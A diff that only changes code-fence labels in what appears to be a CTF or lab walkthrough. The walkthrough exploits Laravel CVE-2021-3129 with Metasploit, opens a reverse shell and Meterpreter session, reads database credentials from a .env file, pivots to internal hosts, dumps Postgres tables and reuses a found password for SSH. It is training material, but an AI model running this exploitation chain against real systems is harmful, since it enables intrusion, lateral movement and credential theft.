@@ -56,7 +56,7 @@ Laravel may be vulnerable to a remote code execution exploit which impacts appli
 
 Search Laravel in Metasploit and run info on the exploit to get `CVE-2021-3129`.
 
-```console
+```text
 msf6 > search laravel
 
 Matching Modules
@@ -134,7 +134,7 @@ View the full module info with the info -d command.
 
 Use Metasploit to verify if the application is vulnerable to this exploit. 
 
-```console
+```text
 msf6 > use multi/php/ignition_laravel_debug_rce
 [*] Using configured payload cmd/unix/reverse_bash
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=10.10.41.251 HttpClientTimeout=20
@@ -145,7 +145,7 @@ msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=10.10.41.251 Ht
 
 Looks like the version of Laravel application is vulnerable to an RCE. Lets run to module to open a session.
 
-```console
+```text
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > run rhost=10.10.41.251 lhost=10.2.4.35 HttpClientTimeout=20
 
 [*] Started reverse TCP handler on 10.2.4.35:4444 
@@ -160,7 +160,7 @@ www-data
 
 Use the `sessions -u -1` command to upgrade the basic shell to a Meterpreter shell (ensure to `background` the basic shell before upgrading).
 
-```console
+```text
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u -1
 [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]                                          
 
@@ -184,7 +184,7 @@ Active sessions
 
 After interacting with the Meterpreter session with `sessions -i -1` and exploring the target machine, we can see there are database credentials available (`postgres:postgres`):
 
-```console
+```text
 meterpreter > cat /var/www/.env
 APP_NAME=Laravel
 APP_ENV=local
@@ -237,7 +237,7 @@ MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
 
 We can use Meterpreter to resolve this remote hostname to an IP address that we can use for attacking purposes:
 
-```console
+```text
 meterpreter > resolve webservice_database
 
 Host resolutions
@@ -250,21 +250,21 @@ Host resolutions
 
 As this is an internal IP address, it won’t be possible to send traffic to it directly. We can instead leverage the network pivoting support within msfconsole to reach the inaccessible host. To configure the global routing table in msfconsole, ensure you have run the `background` command from within a Meterpreter session:
 
-```console
+```text
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 -1
 [*] Route added
 ```
 
 We can also see, due to the presence of the `/.dockerenv` file, that we are in a docker container. By default, Docker chooses a hard-coded IP of `172.17.0.1` to represent the host machine. We will also add that to our routing table for later scanning:
 
-```console
+```text
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 -1
 [*] Route added
 ```
 
 Print the routing table to verify the configuration settings:
 
-```console
+```text
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print
 
 IPv4 Active Routing Table
@@ -280,7 +280,7 @@ IPv4 Active Routing Table
 
 With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target `Postgres`. Starting with a schema dump, followed by running queries to select information out of the database:
 
-```console
+```text
 msf6 exploit(multi/php/ignition_laravel_debug_rce) > use auxiliary/scanner/postgres/postgres_schemadump 
 msf6 auxiliary(scanner/postgres/postgres_schemadump) > run postgres://postgres:postgres@172.28.101.51/postgres
 
@@ -346,7 +346,7 @@ Query Text: 'select * from users'
 
 To further pivot through the private network, we can create a socks proxy within Metasploit:
 
-```console
+```text
 msf6 auxiliary(admin/postgres/postgres_sql) > use auxiliary/server/socks_proxy
 msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
 [*] Auxiliary module running as background job 1.
@@ -356,7 +356,7 @@ msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=
 
 This will expose a port on the attacker machine that can be used to run other network tools through, such as `curl` or `proxychains`.
 
-```console
+```text
 msf6 auxiliary(server/socks_proxy) > curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v
 [*] exec: curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v
 
@@ -388,7 +388,7 @@ msf6 auxiliary(server/socks_proxy) > curl --proxy socks4a://localhost:9050 http:
 
 Run Nmap on the compromised machine using `proxychains`.
 
-```console
+```text
 msf6 auxiliary(server/socks_proxy) > proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
 [*] exec: proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
 
@@ -407,7 +407,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
 
 Let's see if password reuse by the user has occured. Let's try and log in to SSH using the credentials found above (`santa:p4$$w0rd`).
 
-```console
+```text
 msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
 msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa:p4$$w0rd@172.17.0.1
 
@@ -432,7 +432,7 @@ Active sessions
 
 Let's interact with the SSH session:
 
-```console
+```text
 msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i -1
 [*] Starting interaction with 3...
 
